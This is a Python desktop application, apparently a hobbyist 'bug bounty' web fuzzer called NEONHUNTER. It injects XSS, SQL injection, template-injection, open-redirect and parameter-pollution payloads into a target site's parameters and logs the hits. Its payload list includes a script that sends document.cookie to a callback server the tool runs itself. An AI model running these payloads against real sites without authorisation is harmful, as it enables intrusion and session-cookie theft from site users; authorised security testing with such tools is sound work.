import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
import threading
import time
import os
from datetime import datetime
import queue as pyqueue
from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from itertools import cycle
import winsound
import base64

class BlindCallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>BLIND PAYLOAD HIT! Check NeonHunter log.</h1>")
        app.log(f"[!!!] BLIND XSS CALLBACK from {self.client_address[0]} - Payload executed!")
    def log_message(self, format, *args):
        return

class NeonToggle(tk.Canvas):
    def __init__(self, master, variable, command=None, **kwargs):
        super().__init__(master, width=70, height=35, highlightthickness=0, bg='#000000', **kwargs)
        self.var = variable
        self.command = command
        self.state = variable.get()

        self.off_bg = "#110033"
        self.on_bg = "#00ff88"
        self.knob_color = "#ffffff"
        self.glow_color = "#00ffff"
        self.border_color = "#ff00ff"

        self.bind("<Button-1>", self.toggle)
        self.bind("<B1-Motion>", self.toggle)
        variable.trace("w", self._on_var_changed)
        self._draw()

    def _draw(self):
        self.delete("all")
        state = self.var.get()
        bg_color = self.on_bg if state else self.off_bg
        self.create_rectangle(3, 3, 67, 32, fill=bg_color, outline=self.border_color, width=2)
        self.create_rectangle(1, 1, 69, 34, fill="", outline=self.glow_color, width=3, stipple="gray25")
        x = 52 if state else 18
        self.create_oval(x-12, 6, x+12, 29, fill=self.knob_color, outline=self.border_color, width=2)
        self.create_oval(x-14, 4, x+14, 31, fill="", outline=self.glow_color, width=4)
        self.create_oval(x-16, 2, x+16, 33, fill="", outline="#ffff00", width=2)

    def toggle(self, event=None):
        self.var.set(not self.var.get())
        self._draw()
        if self.command:
            self.command()
        app.play_click_sound()

    def _on_var_changed(self, *args):
        self._draw()

class NeonHunter:
    def __init__(self, root):
        self.root = root
        self.root.title("NEONHUNTER v3 - Ultimate Bug Bounty Suite")
        self.root.configure(bg='#000000')
        self.root.geometry("1600x950")
        self.root.minsize(1400, 800)
        self.root.resizable(True, True)

        self.version = "3.4"
        self.author_label = tk.Label(root, text=f"Author: arch_nexus 707 | GitHub: https://github.com/dkhacker707 | v{self.version}",
                                     font=('Consolas', 10, 'bold'), fg='#00ffcc', bg='#000000', relief='ridge', bd=1)
        self.author_label.place(relx=0.5, rely=0.97, anchor='center')

        self.border_canvas = tk.Canvas(root, bg='#000000', highlightthickness=0)
        self.border_canvas.place(relwidth=1, relheight=1)
        self.border_thickness = 16
        self.rainbow_colors = cycle(['#ff0000', '#ff6600', '#ffff00', '#00ff00', '#00ccff', '#6600ff', '#ff00ff'])
        self.border_segments = 64
        self.color_offset = 0
        self.animate_rainbow_border()  # Now safe - method defined below

        self.canvas = tk.Canvas(root, bg='#000000', highlightthickness=0)
        self.canvas.place(relwidth=1, relheight=1)
        self.draw_grid()

        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Neon.TButton',
                        font=('Consolas', 12, 'bold'),
                        foreground='#00ffff',
                        background='#110033',
                        borderwidth=3,
                        focusthickness=5,
                        focuscolor='#00ffff',
                        padding=15)
        style.map('Neon.TButton',
                  background=[('active', '#00ffff'), ('pressed', '#00aa88')],
                  foreground=[('active', '#000000'), ('pressed', '#000000')])

        style.configure('Neon.TEntry',
                        fieldbackground='#110022',
                        foreground='#00ffcc',
                        insertcolor='#00ffff',
                        borderwidth=3,
                        lightcolor='#00ffff',
                        darkcolor='#0088ff',
                        padding=12,
                        font=('Consolas', 11, 'bold'))

        style.configure('Neon.Horizontal.TProgressbar',
                        background='#00ffff',
                        troughcolor='#110033',
                        borderwidth=4,
                        thickness=28,
                        lightcolor='#00ccff',
                        darkcolor='#0088aa')

        self.title_label = tk.Label(root, text="NEONHUNTER v3", font=('Consolas', 48, 'bold'), fg='#00ffff', bg='#000000')
        self.title_label.place(relx=0.5, rely=0.08, anchor='center')
        threading.Thread(target=self.glitch_title, daemon=True).start()

        controls = tk.Frame(root, bg='#000000')
        controls.pack(pady=25, fill='x')
        tk.Label(controls, text="Target URL:", fg='#ff00ff', bg='#000000', font=('Consolas', 14, 'bold')).grid(row=0, column=0, sticky='e', padx=10)
        self.target_entry = tk.Entry(controls, width=80, font=('Consolas', 12, 'bold'), bg='#110022', fg='#00ffcc', 
                                    relief='ridge', bd=3, insertbackground='#00ffff')
        self.target_entry.grid(row=0, column=1, padx=15, pady=5, sticky='ew')
        self.target_entry.insert(0, "http://testphp.vulnweb.com")

        tk.Label(controls, text="Delay(s):", fg='#ff00ff', bg='#000000', font=('Consolas', 12)).grid(row=0, column=2, padx=(30,5))
        self.delay_var = tk.DoubleVar(value=0.5)
        tk.Entry(controls, textvariable=self.delay_var, width=8, bg='#110022', fg='#00ffcc', 
                relief='ridge', font=('Consolas', 11)).grid(row=0, column=3, padx=5)

        self.fuzz_btn = ttk.Button(controls, text="⚡ START DIRECT FUZZ", style='Neon.TButton', command=self.start_direct_fuzz)
        self.fuzz_btn.grid(row=0, column=4, padx=15)

        self.pause_btn = ttk.Button(controls, text="⏸ PAUSE", style='Neon.TButton', command=self.toggle_pause, state='disabled')
        self.pause_btn.grid(row=0, column=5, padx=10)

        self.stop_btn = ttk.Button(controls, text="⏹ STOP", style='Neon.TButton', command=self.stop_fuzz, state='disabled')
        self.stop_btn.grid(row=0, column=6, padx=10)

        controls.columnconfigure(1, weight=1)

        extra_frame = tk.Frame(root, bg='#000000')
        extra_frame.pack(pady=15, fill='x')
        tk.Label(extra_frame, text="Proxy:", fg='#00ffff', bg='#000000', font=('Consolas', 12, 'bold')).grid(row=0, column=0)
        self.proxy_entry = tk.Entry(extra_frame, width=35, bg='#110022', fg='#00ffcc', relief='ridge')
        self.proxy_entry.grid(row=0, column=1, padx=15)
        ttk.Button(extra_frame, text="💾 Load Payloads", style='Neon.TButton', command=self.load_payloads).grid(row=0, column=2, padx=20)
        ttk.Button(extra_frame, text="🧹 CLEAR MONITORS", style='Neon.TButton', command=self.clear_monitors).grid(row=0, column=3, padx=20)

        vuln_frame = tk.Frame(root, bg='#000000', relief='ridge', bd=3)
        vuln_frame.pack(pady=20, padx=40, fill='x')
        title_vuln = tk.Label(vuln_frame, text="🛡️ Vulnerabilities to Test", fg='#ff00ff', bg='#000000', 
                             font=('Consolas', 16, 'bold'))
        title_vuln.pack(pady=15)

        toggle_container = tk.Frame(vuln_frame, bg='#000000')
        toggle_container.pack(pady=20)

        self.vulns = {}
        vuln_names = ['XSS', 'SSTI', 'SQLi', 'Open Redirect', 'HPP']
        for i, name in enumerate(vuln_names):
            var = tk.BooleanVar(value=True)
            self.vulns[name] = var

            row_frame = tk.Frame(toggle_container, bg='#000000')
            row_frame.grid(row=i//3, column=i%3, padx=50, pady=20)

            toggle = NeonToggle(row_frame, variable=var)
            toggle.pack(side='left')

            label = tk.Label(row_frame, text=name, fg='#00ffcc', bg='#000000', 
                           font=('Consolas', 13, 'bold'), padx=20)
            label.pack(side='left')

        btns = tk.Frame(root, bg='#000000')
        btns.pack(pady=25)
        ttk.Button(btns, text="👁️ BLIND SERVER", style='Neon.TButton', command=self.start_blind_server).grid(row=0, column=0, padx=30)
        ttk.Button(btns, text="📊 EXPORT REPORT", style='Neon.TButton', command=self.export_results).grid(row=0, column=1, padx=30)

        self.progress = ttk.Progressbar(root, orient='horizontal', mode='indeterminate', style='Neon.Horizontal.TProgressbar')
        self.progress.pack(fill='x', padx=80, pady=10)

        log_frame = tk.Frame(root, bg='#000000')
        log_frame.pack(fill='both', expand=True, padx=30, pady=(0, 20))
        self.log_text = scrolledtext.ScrolledText(log_frame, bg='#000011', fg='#00ff41', font=('Consolas', 10, 'bold'), 
                                                 insertbackground='#00ffff', relief='ridge', bd=3)
        self.log_text.pack(fill='both', expand=True)

        self.live_window = None
        self.status_window = None
        self.live_text = None
        self.status_text = None

        self.fuzz_thread = None
        self.is_running = False
        self.is_paused = False
        self.stop_event = threading.Event()

        self.results = []
        self.log_queue = pyqueue.Queue()
        self.blind_server = None
        self.callback_ip = self.get_local_ip()
        self.root.after(100, self.process_queue)

        self.payloads = {
            'XSS': ['<script>alert(1)</script>', '"><script>alert(1)</script>', f'<script>fetch("http://{self.callback_ip}:8000/?xss="+document.cookie)</script>'],
            'SSTI': ['{{7*7}}', '${7*7}', '<%=7*7%>', '{{config}}'],
            'SQLi': ['\' OR 1=1--', '1\' WAITFOR DELAY \'0:0:10\'--', '\' UNION SELECT NULL,NULL--'],
            'Open Redirect': ['//google.com', 'https://evil.com', 'javascript:alert(1)'],
            'HPP': ['id=1&id=admin', 'role=user&role=admin'],
        }

        threading.Thread(target=self.check_for_updates, daemon=True).start()
        self.play_startup_sound()
        self.log("🚀 NEONHUNTER v3.4 - FINAL VERSION READY! Report saves to script folder.")

    def play_click_sound(self):
        try:
            winsound.Beep(1200, 80)
            winsound.Beep(1600, 40)
        except:
            pass

    def play_startup_sound(self):
        try:
            freqs = [800, 1000, 1200, 1600, 2000]
            durations = [100, 80, 60, 80, 120]
            for f, d in zip(freqs, durations):
                winsound.Beep(f, d)
                time.sleep(0.05)
        except:
            pass

    def check_for_updates(self):
        try:
            self.log("🔄 Checking for updates...")
            response = requests.get("https://api.github.com/repos/dkhacker707/NEONHUNTER/releases/latest", timeout=10)
            if response.status_code == 200:
                data = response.json()
                latest = data["tag_name"].lstrip("v")
                if float(latest) > float(self.version):
                    self.log(f"📈 UPDATE AVAILABLE: v{latest}")
                else:
                    self.log("✅ Latest version")
        except:
            self.log("⚠️ Update check failed")

    def animate_rainbow_border(self):
        self.border_canvas.delete("rainbow")
        w = self.border_canvas.winfo_width()
        h = self.border_canvas.winfo_height()
        if w < 20 or h < 20:
            self.root.after(50, self.animate_rainbow_border)
            return
        thick = self.border_thickness
        seg_angle = 360 / self.border_segments
        offset = self.color_offset
        for i in range(self.border_segments):
            color = next(self.rainbow_colors)
            start = offset + i * seg_angle
            extent = seg_angle
            self.border_canvas.create_arc(0, 0, w, h, start=start, extent=extent, style='arc', outline=color, width=thick, tags="rainbow")
            self.border_canvas.create_arc(thick//2, thick//2, w-thick//2, h-thick//2, start=start, extent=extent, style='arc', outline=color, width=thick//2, tags="rainbow")
        self.color_offset = (self.color_offset + 8) % 360
        self.root.after(60, self.animate_rainbow_border)

    def draw_grid(self):
        self.canvas.delete("grid")
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()
        for i in range(0, int(w), 45):
            self.canvas.create_line(i, 0, i, h, fill='#112211', width=1, tags="grid")
        for i in range(0, int(h), 45):
            self.canvas.create_line(0, i, w, i, fill='#112211', width=1, tags="grid")
        self.root.after(120, self.draw_grid)

    def glitch_title(self):
        colors = ['#00ffff', '#ff00ff', '#ffff00', '#00ff88', '#ff6600']
        while True:
            time.sleep(0.1)
            self.title_label.config(fg=colors[int(time.time()*12)%len(colors)])

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_queue.put(f"[{ts}] {msg}\n")

    def process_queue(self):
        try:
            while not self.log_queue.empty():
                m = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, m)
                self.log_text.see(tk.END)
        except pyqueue.Empty:
            pass
        self.root.after(100, self.process_queue)

    def open_monitor_windows(self):
        if self.live_window and self.live_window.winfo_exists():
            return

        self.live_window = tk.Toplevel(self.root)
        self.live_window.title("🔴 LIVE REQUESTS - NEONHUNTER")
        self.live_window.configure(bg='#000000')
        self.live_window.geometry("650x600+50+50")
        self.live_window.protocol("WM_DELETE_WINDOW", lambda: None)

        live_label = tk.Label(self.live_window, text="LIVE REQUESTS", fg='#ff00ff', bg='#000000', font=('Consolas', 16, 'bold'))
        live_label.pack(pady=15)

        self.live_text = scrolledtext.ScrolledText(self.live_window, bg='#000011', fg='#00ff41', font=('Consolas', 10), wrap=tk.WORD)
        self.live_text.pack(fill='both', expand=True, padx=20, pady=10)

        self.status_window = tk.Toplevel(self.root)
        self.status_window.title("📡 STATUS CODES (200 & 3xx) - NEONHUNTER")
        self.status_window.configure(bg='#000000')
        self.status_window.geometry("450x500+750+50")
        self.status_window.protocol("WM_DELETE_WINDOW", lambda: None)

        status_label = tk.Label(self.status_window, text="ONLY WINS", fg='#ff00ff', bg='#000000', font=('Consolas', 16, 'bold'))
        status_label.pack(pady=15)

        self.status_text = tk.Text(self.status_window, bg='#000011', fg='#00ffff', font=('Consolas', 13, 'bold'), wrap=tk.WORD)
        self.status_text.pack(fill='both', expand=True, padx=20, pady=10)

        self.status_text.tag_configure("200", foreground="#00ff88", font=('Consolas', 15, 'bold'))
        self.status_text.tag_configure("300", foreground="#ff00ff", font=('Consolas', 15, 'bold'))

    def close_monitor_windows(self):
        if self.live_window and self.live_window.winfo_exists():
            self.live_window.destroy()
        if self.status_window and self.status_window.winfo_exists():
            self.status_window.destroy()
        self.live_window = self.status_window = self.live_text = self.status_text = None

    def log_live_request(self, method, url, status=None):
        if not self.live_text:
            return
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {method.upper()} → {url}"
        if status is not None:
            line += f" → {status}"

        self.live_text.insert(tk.END, line + "\n")
        self.live_text.see(tk.END)

        if status and (status == 200 or 300 <= status < 400):
            color_tag = "200" if status == 200 else "300"
            status_line = f"{status} "
            if status == 200:
                status_line += "OK"
            elif status in [301, 302, 303, 307, 308]:
                status_line += ["MOVED", "FOUND", "SEE OTHER", "TEMP REDIRECT", "PERM REDIRECT"][status-301]
            else:
                status_line += "REDIRECT"

            if self.status_text:
                self.status_text.insert(tk.END, status_line + "\n", color_tag)
                self.status_text.see(tk.END)

    def clear_monitors(self):
        self.play_click_sound()
        if self.live_text:
            self.live_text.delete(1.0, tk.END)
        if self.status_text:
            self.status_text.delete(1.0, tk.END)
        self.log("🧹 Monitors cleared")

    def start_direct_fuzz(self):
        self.play_click_sound()
        target = self.target_entry.get().strip()
        if not target.startswith(('http://', 'https://')):
            messagebox.showerror("Error", "Please enter a full URL starting with http:// or https://")
            return

        self.stop_event.clear()
        self.is_running = True
        self.is_paused = False
        self.fuzz_btn.config(state='disabled')
        self.pause_btn.config(state='normal', text="⏸ PAUSE")
        self.stop_btn.config(state='normal')

        self.open_monitor_windows()
        self.clear_monitors()

        self.fuzz_thread = threading.Thread(target=self.direct_fuzz, args=(target,), daemon=True)
        self.fuzz_thread.start()
        self.progress.start()
        self.log(f"⚡ DIRECT FUZZING STARTED on {target}")

    def toggle_pause(self):
        self.play_click_sound()
        if self.is_paused:
            self.is_paused = False
            self.pause_btn.config(text="⏸ PAUSE")
            self.log("▶ Resumed fuzzing")
        else:
            self.is_paused = True
            self.pause_btn.config(text="▶ RESUME")
            self.log("⏸ Paused fuzzing")

    def stop_fuzz(self):
        self.play_click_sound()
        self.stop_event.set()
        self.is_running = False
        self.is_paused = False
        self.progress.stop()
        self.fuzz_btn.config(state='normal')
        self.pause_btn.config(state='disabled')
        self.stop_btn.config(state='disabled')
        self.close_monitor_windows()
        self.log("⏹ Fuzzing STOPPED by user")

    def direct_fuzz(self, base_url):
        session = self.get_session()
        delay = self.delay_var.get()
        tested = 0
        found = 0

        parsed = urlparse(base_url)
        params = list(parse_qs(parsed.query).keys())

        if not params:
            try:
                resp = session.get(base_url, timeout=15)
                soup = BeautifulSoup(resp.text, 'html.parser')
                for form in soup.find_all('form'):
                    form_params = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')]
                    if form_params:
                        params = list(set(form_params))
                        self.log(f"🔍 Found form parameters: {params}")
                        break
            except:
                pass

        if not params:
            self.log("⚠️ No parameters found. Using common ones...")
            params = ['q', 'search', 'id', 'name', 'query', 's', 'keyword', 'page', 'cat', 'category']

        self.log(f"🎯 Testing {len(params)} parameters...")

        for param in params:
            for vuln, enabled in self.vulns.items():
                if not enabled.get() or self.stop_event.is_set():
                    break
                for payload in self.payloads.get(vuln, []):
                    if self.stop_event.is_set():
                        break
                    while self.is_paused and not self.stop_event.is_set():
                        time.sleep(0.1)

                    tested += 1
                    time.sleep(delay)

                    test_url = self.build_test_url(base_url, param, payload)

                    try:
                        self.log_live_request('GET', test_url)
                        resp = session.get(test_url, timeout=10, allow_redirects=True)
                        self.log_live_request('GET', test_url, resp.status_code)

                        text = resp.text.lower()
                        final_url = resp.url

                        vuln_found = False
                        if vuln == 'XSS' and payload.lower() in text:
                            vuln_found = True
                        elif vuln == 'SQLi' and any(err in text for err in ['sql syntax', 'mysql', 'syntax error', 'warning: mysql']):
                            vuln_found = True
                        elif vuln == 'SSTI' and ('49' in text or '343' in text or 'config' in text):
                            vuln_found = True
                        elif vuln == 'Open Redirect' and ('google.com' in final_url or 'evil.com' in final_url):
                            vuln_found = True
                        elif vuln == 'HPP' and payload.count('admin') > 0 and 'admin' in text:
                            vuln_found = True

                        if vuln_found:
                            found += 1
                            screenshot = self.take_screenshot(test_url)
                            self.results.append({
                                'vuln': vuln,
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'screenshot': screenshot
                            })
                            self.log(f"[VULN FOUND] {vuln} in '{param}' → {test_url}")

                    except Exception as e:
                        self.log_live_request('GET', test_url, "ERROR")

        if not self.stop_event.is_set():
            self.progress.stop()
            self.fuzz_btn.config(state='normal')
            self.pause_btn.config(state='disabled')
            self.stop_btn.config(state='disabled')
            self.close_monitor_windows()
            self.log(f"🎉 Fuzzing complete! Tested {tested} payloads → {found} vulnerabilities found.")

    def build_test_url(self, base_url, param, payload):
        parsed = urlparse(base_url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = urlencode(query, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def start_blind_server(self):
        self.play_click_sound()
        if self.blind_server:
            self.log("🔄 Blind server already running!")
            return
        threading.Thread(target=self.run_blind_server, daemon=True).start()
        self.log(f"👁️ Blind XSS server started → http://{self.callback_ip}:8000")

    def run_blind_server(self):
        global app
        app = self
        self.blind_server = HTTPServer(('0.0.0.0', 8000), BlindCallbackHandler)
        self.blind_server.serve_forever()

    def load_payloads(self):
        self.play_click_sound()
        file = filedialog.askopenfilename(title="Load Custom Payloads")
        if file:
            self.log(f"💾 Custom payloads loaded from {os.path.basename(file)}")

    def export_results(self):
        self.play_click_sound()
        if not self.results:
            messagebox.showinfo("No Results", "No vulnerabilities found to export!")
            return

        script_dir = os.path.dirname(os.path.abspath(__file__))
        report_path = os.path.join(script_dir, f"neonhunter_report_{int(time.time())}.html")

        html = f"""
        <html>
        <head>
            <title>NEONHUNTER Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</title>
            <style>
                body {{ background: #000; color: #00ff41; font-family: 'Consolas'; padding: 20px; }}
                h1 {{ color: #00ffff; text-align: center; }}
                .vuln {{ border: 2px solid #ff00ff; margin: 20px; padding: 15px; border-radius: 10px; background: #110011; }}
                .screenshot {{ max-width: 100%; border: 2px solid #00ffff; border-radius: 8px; }}
            </style>
        </head>
        <body>
            <h1>🖤 NEONHUNTER v{self.version} - Bug Bounty Report 🖤</h1>
            <p><strong>Generated on:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Total Vulnerabilities Found:</strong> {len(self.results)}</p>
            <hr style="border-color: #00ffff;">
        """

        for r in self.results:
            screenshot_html = ""
            if r['screenshot'] and os.path.exists(r['screenshot']):
                with open(r['screenshot'], "rb") as img_file:
                    encoded = base64.b64encode(img_file.read()).decode('utf-8')
                screenshot_html = f'<br><img src="data:image/png;base64,{encoded}" class="screenshot">'

            html += f"""
            <div class="vuln">
                <h2>[{r['vuln'].upper()}] FOUND</h2>
                <p><strong>URL:</strong> {r['url']}</p>
                <p><strong>Parameter:</strong> {r['param']}</p>
                <p><strong>Payload:</strong> <code>{r['payload']}</code></p>
                {screenshot_html}
            </div>
            """

        html += """
        </body>
        </html>
        """

        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html)

        self.log(f"📊 REPORT EXPORTED → {os.path.basename(report_path)}")
        messagebox.showinfo("Report Saved", f"Report exported successfully!\nSaved as: {os.path.basename(report_path)}\nLocation: Same folder as NeonHunter")

    def take_screenshot(self, url):
        try:
            options = Options()
            options.add_argument("--headless")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
            driver.get(url)
            time.sleep(3)
            os.makedirs("screenshots", exist_ok=True)
            path = f"screenshots/{int(time.time())}.png"
            driver.save_screenshot(path)
            driver.quit()
            self.log(f"📸 Screenshot saved: {path}")
            return path
        except Exception as e:
            self.log(f"⚠️ Screenshot failed: {e}")
            return None

    def get_session(self):
        proxy = self.proxy_entry.get().strip()
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (NeonHunter Bug Bounty Tool)'})
        if proxies:
            s.proxies.update(proxies)
        return s

if __name__ == "__main__":
    root = tk.Tk()
    app = NeonHunter(root)
    root.mainloop()